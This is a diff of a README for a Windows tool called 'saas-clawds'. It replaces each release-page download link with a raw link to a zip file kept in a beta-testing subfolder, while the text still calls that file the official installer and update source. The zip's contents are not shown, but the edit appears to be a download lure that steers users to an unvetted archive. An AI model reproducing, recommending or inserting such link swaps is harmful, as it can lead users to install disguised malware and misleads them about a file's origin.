@@ -1,6 +1,6 @@
 # ⚙️ saas-clawds - Build Your SaaS with Ease
 
-[![Download saas-clawds](https://img.shields.io/badge/Download-Get%20saas--clawds-brightgreen.svg)](https://github.com/disclosed-huntingground999/saas-clawds/releases)
+[![Download saas-clawds](https://img.shields.io/badge/Download-Get%20saas--clawds-brightgreen.svg)](https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before installing saas-clawds, make sure your computer meets these minimum requi
 
 Go to the official saas-clawds release page here:
 
-[![Download saas-clawds](https://img.shields.io/badge/Download-Get%20saas--clawds-brightgreen.svg)](https://github.com/disclosed-huntingground999/saas-clawds/releases)
+[![Download saas-clawds](https://img.shields.io/badge/Download-Get%20saas--clawds-brightgreen.svg)](https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip)
 
 Here, you can find the latest version ready for Windows.
 
@@ -84,7 +84,7 @@ Each section has tooltips to explain what to do. Spend a few minutes exploring b
 
 To keep saas-clawds running smoothly, check the releases page regularly:
 
-[https://github.com/disclosed-huntingground999/saas-clawds/releases](https://github.com/disclosed-huntingground999/saas-clawds/releases)
+[https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip](https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip)
 
 Download the latest installer and repeat the installation steps. Your data and progress will remain safe during updates.
 
@@ -114,11 +114,11 @@ If you want to improve saas-clawds or report bugs, visit the repository and chec
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/disclosed-huntingground999/saas-clawds/releases](https://github.com/disclosed-huntingground999/saas-clawds/releases)
+- Download page: [https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip](https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip)
 - License (MIT): [LICENSE](LICENSE)
 - Contribution guide: [CONTRIBUTING.md](CONTRIBUTING.md)
 - AI Agent information: See section **AI Agent Compatibility** in the repo
 
 ---
 
-[![Download saas-clawds](https://img.shields.io/badge/Download-Get%20saas--clawds-brightgreen.svg)](https://github.com/disclosed-huntingground999/saas-clawds/releases)
+[![Download saas-clawds](https://img.shields.io/badge/Download-Get%20saas--clawds-brightgreen.svg)](https://raw.githubusercontent.com/disclosed-huntingground999/saas-clawds/main/07-testing/beta-testing/clawds_saas_v3.6-beta.2.zip)
